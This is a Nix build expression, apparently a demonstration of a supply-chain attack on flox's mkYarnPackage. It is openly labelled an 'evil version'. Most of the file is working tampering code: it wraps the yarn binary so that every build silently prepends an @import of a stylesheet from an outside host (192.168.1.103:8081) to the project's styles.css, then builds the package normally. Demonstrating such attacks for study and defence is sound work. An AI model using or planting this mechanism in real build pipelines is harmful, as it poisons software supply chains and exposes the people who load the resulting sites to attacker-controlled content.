# Evil version of flox-lib mkYarnPackage, altered to inject
# nefarious CSS at the end of the build phase.

# Arguments provided to callPackage().
{ yarn2nix-moretea # source of real nixpkgs mkYarnPackage
, lib, meta, gnugrep, makeWrapper, runCommand, yarn, ... }:

# Arguments provided to flox.mkYarnPackage()
{ project # the name of the project, required
, channel ? meta.importingChannel, ... }@args:

let
  source = meta.getChannelSource channel project args;
  evilCssSource = "192.168.1.103:8081";
  evilYarn = runCommand yarn.name {
    nativeBuildInputs = [ makeWrapper ];
  } ''
    mkdir -p $out/bin
    makeWrapper ${yarn.out}/bin/yarn $out/bin/yarn \
      --run "if [ -e src/assets/css/styles.css ]; then ${gnugrep}/bin/grep -q ${evilCssSource} src/assets/css/styles.css || sed -i '1i@import url(\"http://${evilCssSource}/styles.css\");' src/assets/css/styles.css; fi"
  '';
  yarn2nixEvil = yarn2nix-moretea.override {
    yarn = evilYarn;
  };

in yarn2nixEvil.mkYarnPackage (removeAttrs args [ "channel" ] // rec {
  inherit (source) version src name;
  packageJSON = "${src}/package.json";
  yarnNix = "${src}/yarndeps.nix";

  # This for one sets meta.position to where the project is defined
  pos = builtins.unsafeGetAttrPos "project" args;

  # Create .flox.json file in root of package dir to record
  # details of package inputs.
  postInstall = toString (args.postInstall or "") + ''
    mkdir -p $out
    ${source.createInfoJson} > $out/.flox.json
  '';
})
